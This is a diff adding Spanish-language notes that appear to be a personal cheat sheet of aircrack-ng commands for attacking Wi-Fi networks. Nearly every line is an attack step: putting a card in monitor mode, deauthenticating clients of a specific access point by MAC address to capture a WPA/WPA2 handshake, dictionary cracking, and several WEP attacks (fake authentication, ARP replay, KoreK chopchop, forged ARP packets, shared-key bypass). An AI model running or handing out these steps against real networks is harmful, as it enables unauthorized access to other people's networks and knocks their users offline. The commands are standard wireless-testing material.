@@ -1,2 +1,112 @@
 
-asdada
+
+## Iniciar tarjeta en modo monitor
+
+ifconfig / iwconfig   -- para saber nombre de la red wlan0 / wlan0mon   
+
+airmon-ng start wlan0  /or/ iwconfig wlan0 mode monitor
+airmon-ng check kill
+airmon-ng stop wlan0  
+
+
+##apagar o prender interfaz de red
+
+ifconfig eth0 down
+ifconfig eth0 up
+
+sudo ip link set wlan0 down
+sudo ip link set wlan0 up
+
+
+### Ataque a red WPA/WPA2 PSK
+
+Sudo iwconfig wlan0 mode monitor
+Sudo airmon-ng check kill
+sudo airodump-ng wlan0
+
+//captura de paquetes
+sudo airodump-ng -c 4 --bssid 04:FE:8D:76:5B:88 -w wpa2 wlan0   
+
+//Deautenticación
+sudo aireplay-ng -0 10 -a "04:FE:8D:76:5B:88" -c "9C:5A:81:EA:D9:5E" wlan0
+
+//Crackeo de handshake
+sudo aircrack-ng -0 -w Documents/crackstation.txt wpa2-01.cap
+
+
+###### WEP con clientes OpenSystem ##############
+
+airmon-ng start wlan0
+airmon-ng check kill
+
+//Capturar tramas Wireless en un punto de acceso y canal específico
+airodump-ng -c 11 --bssid $bssid -w wep_clientes_open $wlan0    --- VER SI HAY CLIENTES CONECTADOS o no
+
+VER SI HAY CLIENTES CONECTADOS o no
+
+//Ataque de autenticación falsa
+aireplay-ng -1 0 -e $essid -a $bssid -h $wlan0_mac $wlan0  --- AQUI DEVUELVE SI ES OPN O SKA
+
+nota0: si no deja hacer la autenticación false es que es SKA
+nota1: hacer primero ataque de arp replay y luego el de detautenticación.
+nota2: ver en la captura que la data pase los 100.000 
+
+//Ataque de ARP replay
+aireplay-ng -3 -b $bssid -h $wlan0_mac $wlan0
+
+//Ataque de deautenticación
+aireplay-ng -0 1 -a $bssid -c $cliente $wlan0
+
+
+
+//Crackeo de contraseña WEP
+aircrack-ng -0 $captura.cap
+
+
+
+###### WEP sin clientes OpenSystem ###################
+
+airmon-ng start wlan0
+airmon-ng check kill
+
+//Capturar tramas Wireless en un punto de acceso y canal específico
+airodump-ng -c 11 --bssid $bssid -w wep_clientes_open $wlan0
+
+//Ataque de autenticación falsa con reasociación  --AQUI devuelve si es OPN o SKA!!
+aireplay-ng -1 60 -e $essid -a $bssid -h $wlan0_mac $wlan0
+
+//Ataque KoreK chopchop
+aireplay-ng -4 -b $bssid -h $wlan0_mac $wlan0
+
+//Creación de paquete ARP artificial
+packetforge-ng -0 -a $bssid -h $wlan0_mac -l 255.255.255.255 -k255.255.255.255 -y $captura_xor -w $captura_artificial
+
+//Ataque Replay interactivo
+aireplay-ng -2 -r $arp_artificial $wlan0
+
+//Crackeo de contraseña WEP
+aircrack-ng -0 $captura
+
+
+### WEP con clientes 'SKA' Shared Key Authentication
+
+airmon-ng start wlan0
+airmon-ng check kill
+
+//Capturar tramas Wireless en un punto de acceso y canal específico
+airodump-ng -c 11 --bssid $bssid -w wep_clientes_open $wlan0
+
+//Ataque de deautenticación para capturar archivo shared key XOR
+aireplay-ng -0 1 -a $bssid -c $cliente $wlan0
+
+//Ataque de autenticación falsa con reasociación usando archivoshared key XOR
+aireplay-ng -1 60 -e $essid -a $bssid -h $wlan0_mac -y $shared_key_xor $wlan0
+
+//Ataque de ARP replay
+aireplay-ng -3 -b $bssid -h $wlan0_mac $wlan0
+
+volver hacer la deautenticacion
+aireplay-ng -0 1 -a $bssid -c $cliente $wlan0
+
+//Crackeo de contraseña WEP SKA
+aircrack-ng -0 $captura
